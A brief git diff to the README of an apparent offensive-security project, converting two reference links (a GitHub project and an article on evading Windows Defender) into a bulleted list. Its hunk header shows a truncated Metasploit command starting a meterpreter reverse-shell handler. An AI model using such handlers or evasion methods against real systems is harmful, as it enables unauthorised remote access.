@@ -24,5 +24,5 @@ sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterp
 
 ### External references
 
-[charlotte](https://github.com/9emin1/charlotte)
-[Bypassing Windows Defender with Environmental Decryption Keys](https://www.secarma.com/bypassing-windows-defender-with-environmental-decryption-keys/)
+* [charlotte](https://github.com/9emin1/charlotte)
+* [Bypassing Windows Defender with Environmental Decryption Keys](https://www.secarma.com/bypassing-windows-defender-with-environmental-decryption-keys/)
